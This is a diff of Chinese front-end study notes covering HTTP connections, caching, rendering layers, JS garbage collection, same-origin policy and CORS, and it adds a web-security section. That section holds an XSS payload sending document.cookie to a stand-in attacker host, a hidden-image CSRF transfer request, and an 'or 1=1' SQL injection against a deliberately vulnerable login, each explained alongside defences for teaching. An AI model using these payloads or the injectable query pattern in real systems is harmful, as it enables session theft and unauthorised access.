@@ -206,9 +206,13 @@ Server：服务器的一些相关信息
           拆分成多域名时，在移动端会降低请求速度。因为域名整套解析流程是很耗费时间的，而且移动端一般带宽都比不上 pc，此时可以用 dns-prefetch 进行优化（让浏览器空闲时提前解析 dns 域名，不过也请合理使用，勿滥用）
 
 #####4.3 长连接和短连接
-tcp/ip 层面的定义： > 长连接：个 tcp/ip 连接上可以连续发送多个数据包，在 tcp 连接保持期间，如果没有数据包发送，需要双方发检测包以维持此连接，一般需要自己做在线维持（类似于心跳包） > 短连接：通信双方有数据交互时，就建立一个 tcp 连接，数据发送完成后，则断开此 tcp 连接 > 在 http 中： > http1.0：默认使用的是短连接，也就是说，浏览器每进行一次 http 操作，就建立一次连接，任务结束就中断连接，譬如每一个静态资源请求时都是一个单独的连接 > http1.1：默认使用的是长连接。使用长连接会有这一行 Connection: keep-alive，在长连接的情况下，当一个网页打开完成后，客户端和服务端之间用于传输 http 的 tcp 连接不会关闭，如果客户端再次访问这个服务器的页面，会继续使用这一条已经建立的连接
+tcp/ip 层面的定义：
+
+> 长连接：个 tcp/ip 连接上可以连续发送多个数据包，在 tcp 连接保持期间，如果没有数据包发送，需要双方发检测包以维持此连接，一般需要自己做在线维持（类似于心跳包） > 短连接：通信双方有数据交互时，就建立一个 tcp 连接，数据发送完成后，则断开此 tcp 连接 > 在 http 中： > http1.0：默认使用的是短连接，也就是说，浏览器每进行一次 http 操作，就建立一次连接，任务结束就中断连接，譬如每一个静态资源请求时都是一个单独的连接 > http1.1：默认使用的是长连接。使用长连接会有这一行 Connection: keep-alive，在长连接的情况下，当一个网页打开完成后，客户端和服务端之间用于传输 http 的 tcp 连接不会关闭，如果客户端再次访问这个服务器的页面，会继续使用这一条已经建立的连接
+
 #####4.4 http2.0
-2.0 的一些特性：
+
+> 2.0 的一些特性：
 
 -   多路复用（即一个 tcp/ip 连接可以请求多个资源）
 -   首部压缩（http 头部压缩，减少体积）
@@ -241,7 +245,7 @@ http 缓存分为强缓存（200 from cache）和协商缓存(304)
     > http1.1:Cache-Control/Max-Age
     > http1.0:Pragma/Expires
     > #####5.2 协商缓存（304 from cache）
-        浏览器向服务器发送http请求,然后服务端告诉浏览器文件未改变，让浏览器使用本地缓存
+           浏览器向服务器发送http请求,然后服务端告诉浏览器文件未改变，让浏览器使用本地缓存
 -   属于协商缓存控制的请求头：
     > http1.1 If-None-Match/E-tag
     > http1.0 If-Modified-Since/Last-Modified
@@ -341,19 +345,17 @@ http 缓存分为强缓存（200 from cache）和协商缓存(304)
 #####6.6 简单图层和复合图层
 
 1. 简单图层
-    >1.1 普通文档流内可以理解为一个复合图层（这里称为默认复合层，里面不管添加多少元素，其实都是在同一个复合图层中）
-    >1.2 absolute和fixed元素虽然脱离了普通文档流，但仍在同一个复合图层中
-2. 复合图层
-    >2.1 开启硬件加速可以开启一个新的复合图层。复合图层之间是相互独立的,绘制的时候互不干扰,由GPU绘制
-    >2.2 所有做动画的时候一般使用硬件加速开启个图层.开启图层的时候注意使用zindex,防止浏览器默认给后续的元素创建复合层渲染
-####7 css和js相关知识
-#####7.1 盒模型 块元素 行内元素 BFC IFC css参考css目录
-#####7.2 JS执行上下文 VO AO 作用域链 this指向 js参考js目录
-#####7.3 js垃圾回收机制
-1. 标记清除 
-   >js引擎基础GC方案(simple GC ):mark and sweep(标记清除)
-   - 遍历所有可访问的对象,
-   - 回收已不可访问的对象
+    > 1.1 普通文档流内可以理解为一个复合图层（这里称为默认复合层，里面不管添加多少元素，其实都是在同一个复合图层中）
+    > 1.2 absolute 和 fixed 元素虽然脱离了普通文档流，但仍在同一个复合图层中
+2. 复合图层 >2.1 开启硬件加速可以开启一个新的复合图层。复合图层之间是相互独立的,绘制的时候互不干扰,由 GPU 绘制 >2.2 所有做动画的时候一般使用硬件加速开启个图层.开启图层的时候注意使用 zindex,防止浏览器默认给后续的元素创建复合层渲染
+   ####7 css 和 js 相关知识
+   #####7.1 盒模型 块元素 行内元素 BFC IFC => css 参考 css 目录
+   #####7.2 JS 执行上下文 VO AO 作用域链 this 指向 => js 参考 js 目录
+   #####7.3 js 垃圾回收机制
+3. 标记清除
+    > js 引擎基础 GC 方案(simple GC ):mark and sweep(标记清除)
+    - 遍历所有可访问的对象,
+    - 回收已不可访问的对象
     ```
     当变量进入环境时，例如，在函数中声明一个变量，就将这个变量标记为“进入环境”。从逻辑上讲，永远不能释放进入环境的变量所占用的内存，因为只要执行流进入相应的环境，就可能会用到它们。
     而当变量离开环境时，则将其标记为“离开环境”。
@@ -362,28 +364,33 @@ http 缓存分为强缓存（200 from cache）和协商缓存(304)
     而在此之后再被加上标记的变量将被视为准备删除的变量，原因是环境中的变量已经无法访问到这些变量了。
     最后，垃圾回收器完成内存清除工作，销毁那些带标记的值并回收它们所占用的内存空间
     ```
-2. 引用计数
-   ```
-   跟踪记录每个值被引用的次数，当一个值被引用时，次数+1，减持时-1，下次垃圾回收器会回收次数为0的值的内存（当然了，容易出循环引用的bug）
-   ```
-3. **GC的缺陷**
-   >GC时，停止响应其他操作.而Javascript的GC在100ms甚至以上
-4. **GC优化策略**
-   使用:*分代回收*
-   >1 多回收“临时对象”区（young generation）
-   >2 少回收“持久对象”区（tenured generation）
-   >3 减少每次需遍历的对象，从而减少每次GC的耗时。
+4. 引用计数
+    ```
+    跟踪记录每个值被引用的次数，当一个值被引用时，次数+1，减持时-1，下次垃圾回收器会回收次数为0的值的内存（当然了，容易出循环引用的bug）
+    ```
+5. **GC 的缺陷**
+    > GC 时，停止响应其他操作.而 Javascript 的 GC 在 100ms 甚至以上
+6. **GC 优化策略**
+   使用:_分代回收_
+    > 1 多回收“临时对象”区（young generation）
+    > 2 少回收“持久对象”区（tenured generation）
+    > 3 减少每次需遍历的对象，从而减少每次 GC 的耗时。
+
 #### 8 跨域
+
 #####8.1 同源政策
->同源指的是:协议相同,域名相同,端口号相同.
-- 1 同源的目的: 是为了保护用户信息的安全,防止恶意的网站窃取数据
-- 2 同源限制了哪些东西:
-  >2.1 cookie localStorage和indexDB
-  >2.2 dom无法获取
-  >2.3 ajax请求
-#####8.2 不同源的网站通信问题
-如果在iframe中,父窗口和子窗口不同源,可以采用以下方法进行通信
-- 1 改变iframe src中的锚点.子窗口监听hash值的改变,获取对应的信息
+
+> 同源指的是:协议相同,域名相同,端口号相同.
+
+-   1 同源的目的: 是为了保护用户信息的安全,防止恶意的网站窃取数据
+-   2 同源限制了哪些东西:
+    > 2.1 cookie localStorage 和 indexDB
+    > 2.2 dom 无法获取
+    > 2.3 ajax 请求
+    > #####8.2 不同源的网站通信问题
+    > 如果在 iframe 中,父窗口和子窗口不同源,可以采用以下方法进行通信
+-   1 改变 iframe src 中的锚点.子窗口监听 hash 值的改变,获取对应的信息
+
     ```
     var src = originURL + '#' + data;
     document.getElementById('myIFrame').src = src;
@@ -394,19 +401,22 @@ http 缓存分为强缓存（200 from cache）和协商缓存(304)
     // ...
     }
     ```
-- 2 使用window.name属性
-  >这个属性的最大特点是，无论是否同源，只要在同一个窗口里，前一个网页设置了这个属性，后一个网页可以读取它。
-- 3 使用otherWindow.postMessage
-  >h5为了解决跨域通信的问题,引入了postMessage API.此api的详细信息参考[postmessage](js/postMessage1.html)
-  - 通过postMessage,可以读取其他窗口的localStorage信息
-#####8.3 不同源的网站ajax通信
-因为同源政策限制,ajax请求不能发送给不同源的网站.为此有以下几种方法解决
-- 1 JSONP
-  >该方法利用script标签可以请求不同源的文件.然后在src属性上传递回调参数.这样请求回来的文件解析时就会触发相应的回调函数
-- 2 websocket
-  >WebSocket是一种通信协议，使用ws://（非加密）和wss://（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。
-  
-  WebSocket请求的头信息
+
+-   2 使用 window.name 属性
+    > 这个属性的最大特点是，无论是否同源，只要在同一个窗口里，前一个网页设置了这个属性，后一个网页可以读取它。
+-   3 使用 otherWindow.postMessage
+    > h5 为了解决跨域通信的问题,引入了 postMessage API.此 api 的详细信息参考[postmessage](js/postMessage1.html)
+    -   通过 postMessage,可以读取其他窗口的 localStorage 信息
+        #####8.3 不同源的网站 ajax 通信
+        因为同源政策限制,ajax 请求不能发送给不同源的网站.为此有以下几种方法解决
+-   1 JSONP
+    > 该方法利用 script 标签可以请求不同源的文件.然后在 src 属性上传递回调参数.这样请求回来的文件解析时就会触发相应的回调函数
+-   2 websocket
+
+    > WebSocket 是一种通信协议，使用 ws://（非加密）和 wss://（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。
+
+    WebSocket 请求的头信息
+
     ```
     GET /chat HTTP/1.1
     Host: server.example.com
@@ -417,27 +427,32 @@ http 缓存分为强缓存（200 from cache）和协商缓存(304)
     Sec-WebSocket-Version: 13
     Origin: http://example.com //表示该请求的请求源（origin），即发自哪个域名
     ```
-    **正是因为Origin字段,服务器可以根据这个字段，判断是否许可本次通信,所以WebSocket才没有实行同源政策**
-##### 8.4 单独的CORS
-  >跨源资源分享（Cross-Origin Resource Sharing）的缩写.它是W3C标准，是跨源AJAX请求的根本解决方法。相比JSONP只能发GET请求，CORS允许任何类型的请求。
-  
-  4.1  **CORS中分为简单请求和非简单请求**,满足以下条件的就是简单请求
-  1. 请求方法是以下三种方法之一：
-      - head,
-      - get 
-      - post
-  2. HTTP的头信息不超出以下几种字段
-      - Accept
-      - Accept-Language
-      - Content-Language
-      - Last-Event-ID
-      - Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain
 
+    **正是因为 Origin 字段,服务器可以根据这个字段，判断是否许可本次通信,所以 WebSocket 才没有实行同源政策**
 
-   4.2  **简单请求**
-    1. 对于简单请求，浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个Origin字段。
+##### 8.4 单独的 CORS
 
-   4.3 **非简单请求**
+> 跨源资源分享（Cross-Origin Resource Sharing）的缩写.它是 W3C 标准，是跨源 AJAX 请求的根本解决方法。相比 JSONP 只能发 GET 请求，CORS 允许任何类型的请求。
+
+4.1 **CORS 中分为简单请求和非简单请求**,满足以下条件的就是简单请求
+
+1. 请求方法是以下三种方法之一：
+    - head,
+    - get
+    - post
+2. HTTP 的头信息不超出以下几种字段
+    - Accept
+    - Accept-Language
+    - Content-Language
+    - Last-Event-ID
+    - Content-Type：只限于三个值 application/x-www-form-urlencoded、multipart/form-data、text/plain
+
+4.2 **简单请求**
+
+1. 对于简单请求，浏览器直接发出 CORS 请求。具体来说，就是在头信息之中，增加一个 Origin 字段。
+
+4.3 **非简单请求**
+
 ```
     OPTIONS /cors HTTP/1.1
     Origin: http://api.bob.com
@@ -451,13 +466,15 @@ http 缓存分为强缓存（200 from cache）和协商缓存(304)
 
     1. 对应的是PUT,DELETE请求,或者post请求但是content-type是application/json
     2. 非简单请求,会在正式通信之前,增加一次http查询请求,称为"预检"请求（preflight）.预检请求使用的方式是options.
-   
+
 4.4 **预检请求**
+
 1. 请求头主要的字段:
-    >Origin
-    >Access-Control-Request-Method
-    >Access-Control-Request-Headers:该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段
+    > Origin
+    > Access-Control-Request-Method
+    > Access-Control-Request-Headers:该字段是一个逗号分隔的字符串，指定浏览器 CORS 请求会额外发送的头信息字段
 2. 响应头
+
 ```
         HTTP/1.1 200 OK
         Date: Mon, 01 Dec 2008 01:15:39 GMT
@@ -472,34 +489,139 @@ http 缓存分为强缓存（200 from cache）和协商缓存(304)
         Connection: Keep-Alive
         Content-Type: text/plain
 ```
-- 响应头主要的字段:
-            >Access-Control-Allow-Origin
-            >Access-Control-Allow-Methods: GET, POST, PUT
-            >Access-Control-Allow-Headers: X-Custom-Header
-            >Access-Control-Allow-Credentials: true
-            >Access-Control-Max-Age: 1728000
-- **响应头中的Max-Age**
-    >用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。
-        
 
-4.5 **如何在cors中传递cookie**
-- 1 在服务器端设置Access-Control-Allow-Credentials为true.
-        >该字段表示是否允许发送Cookie
-- 2 在ajax请求中设置xhr.withCredentials  = true
-- 3  Access-Control-Allow-Origin就不能设为星号，必须指定明确的、与请求网页一致的域名.
-    >同时，Cookie依然遵循同源政策，只有用服务器域名设置的Cookie才会上传，其他域名的Cookie并不会上传，且（跨源）原网页代码中的document.cookie也无法读取服务器域名下的Cookie。
-  
+-   响应头主要的字段:
+    > Access-Control-Allow-Origin
+    > Access-Control-Allow-Methods: GET, POST, PUT
+    > Access-Control-Allow-Headers: X-Custom-Header
+    > Access-Control-Allow-Credentials: true
+    > Access-Control-Max-Age: 1728000
+-   **响应头中的 Max-Age**
+    > 用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是 20 天（1728000 秒），即允许缓存该条回应 1728000 秒（即 20 天），在此期间，不用发出另一条预检请求。
 
-#### 9 web安全
+4.5 **如何在 cors 中传递 cookie**
+
+-   1 在服务器端设置 Access-Control-Allow-Credentials 为 true.
+    > 该字段表示是否允许发送 Cookie
+-   2 在 ajax 请求中设置 xhr.withCredentials = true
+-   3 Access-Control-Allow-Origin 就不能设为星号，必须指定明确的、与请求网页一致的域名.
+
+    > 同时，Cookie 依然遵循同源政策，只有用服务器域名设置的 Cookie 才会上传，其他域名的 Cookie 并不会上传，且（跨源）原网页代码中的 document.cookie 也无法读取服务器域名下的 Cookie。
+
+#### 9 web 安全
+
+常见的 web 安全问题：1 csrf（跨站请求伪造）2 xss（跨站脚本注入）3 sql 注入
+
+#####9.1 **CSRF（跨站请求伪造）**
+    > 特征：**冒用用户身份，进行恶意操作**，前提是用户已经登录了账号，没有退出，然后访问危险网站。
+
+![CSRF](https://segmentfault.com/img/remote/1460000012693783?w=904&h=739)
+
+```
+1 采用cookie来进行用户校验
+2 登录受信任网站A，并在本地生成Cookie
+3 在不登出A的情况下，访问危险网站B
+4 危险网站B调用指向A的接口发出攻击，整个情况没有获取A的cookie，利用web的cookie隐式身份验证机制来攻击。即使A的cookie是http-only，也会中招
+```
+
+防御 CSRF 攻击的手段：
+
+-   1 验证 http 的 Referer 字段，但是完全依赖浏览器发送正确的 referer,也不是很可靠。因为完全依靠浏览器的具体实现，存在浏览器被破解的篡改其 referer 字段的可能
+-   2 在请求参数中加入 token 验证，比如 post 中，以参数的形式加个随机产生的 token
+
+#####9.2  **XSS（跨域脚本注入）**
+    > 特征:击者通过某种方式将恶意代码注入到网页上，然后其他用户观看到被注入的页面内容后会受到特定攻击
+
+
+2.1 **cookie 劫持** _攻击者获取到用户的 cookie_
+
+> 例如，页面有一个评论输入，输入后会，因为后台的漏洞，没有过滤特殊字符，会直接明文保存到数据库中，然后展示到网页时直接展示明文数据。
+
+```
+<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
+<form action="saveComment.jsp" method="post">
+     请输入评论内容：<BR>
+     <input name="content" type="text">
+     <input type="submit" value="确认">
+</form>
+```
+
+> 然后攻击者分析后，输入
+
+```
+script>window.open("http://www.attackpage.com/record?secret=" + document.cookie)</script>
+```
+
+由于没有过滤脚本，**那么其它用户登陆后，在看到这篇文章时就会自动将他们的 cookie 信息都发送到了攻击者的服务器。攻击者可以在 cookie（譬如 jsessionid 对应的 session）有效期内拿它们冒充用户操作。**
+_这里是拿到了 cookie 后主动冒充用户的，而 CSRF 中根本就不知 cookie，仅利用浏览器的隐式校验方式冒充用户。_
+
+2.2 回话伪造。XSS形成的CSRF
+>同样是评论漏洞的示例。攻击者输入（举例比喻）
+```
+<img src=http://www.bank.example/transfer?toBankId=hello&amount=1000000 width='0' height='0'>
+```
+>然后接下来发生的事情和CSRF中提到的一致。
+
+**这里也没有拿到网站的cookie，而是借助浏览器的隐式校验机制来冒充客户**
+
+2.3 **其他恶意代码执行**
+>专指前端的流氓JS，譬如前面的输入可以是：
+>1 游戏弹窗
+>2 无限循环的代码
+>3 让页面直接卡死
+
+还有**富文本攻击**，在富文本中注入了脚本，前后端未过滤，导致直接输入到了页面上。
+**结论：**
+**只要最终能向页面输出可执行的脚本语句，那么就是有漏洞，XSS攻击都有可能发生。**
+
+防御XSS的手段：
+- 1 输入过滤。不信任用户的输入，过滤其中的“<”、“>”、“/”等可能导致脚本注入的特殊字符。或者过滤script”、“javascript”等脚本关键字，或者对输入数据的长度进行限制等等，还要考虑攻击者使用十六进制编码来输入脚本的方式。
+- 2 输出进行编码。和输入过滤类似，不过是从输出上着手，数据输出到页面时，经过HtmlEncoder等工具编码，这样就不会存在直接输出可执行的脚本了
+- 3 cookie设置http-only，这样用脚本就无法获取cookie了，避免脚本使用document.cookie获取网站的cookie
+- 4 cookie防盗，尽可能地避免在Cookie中泄露隐私，如用户名、密码等
+- 5 后台不能信任前端的输入，一定要进行过滤
+
+#####9.3 SQL注入
+>如果后台没有过滤前端的输入数据,那么就可能形成SQL注入
+
+假设页面A中有一个登陆查询存在拙劣的sql注入漏洞，这样子的：（最极端，最傻的情况）
+```
+<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
+<form action="login.jsp" method="post"> 
+     请输入用户名与密码：<BR> 
+     <input name="name" type="text"> 
+     <input name="password" type="text"> 
+     <input type="submit" value="登陆">
+</form> 
+```
+在接收到登陆请求后，服务端的实际执行代码时是：
+```
+String sql = "SELECT * FROM users WHERE name = '" + name + "' AND password = '" + password + "'";
+```
+然而有攻击者分析出后台可能存在漏洞，尝试sql注入攻击，输入
+```
+name = ''
+password = ''  or 1=1
+```
+那么这样，后台接收到数据后，实际上查询的结果是
+```
+SELECT * FROM users WHERE name = '''' AND password = '''' or 1=1
+```
+故而，攻击者成功的绕过的用户名，利用后台漏洞登陆了。
+
+
 #### 10 错误处理机制
+
 #### 11 viewport 移动端相关知识
+
 #### 12 性能优化
+
 #### 13 mpvue
-#### 14 Vue框架相关知识
-#### 15 react框架
+
+#### 14 Vue 框架相关知识
+
+#### 15 react 框架
+
 #### 16 nodejs
+
 #### 17 设计模式
-
-
-
-
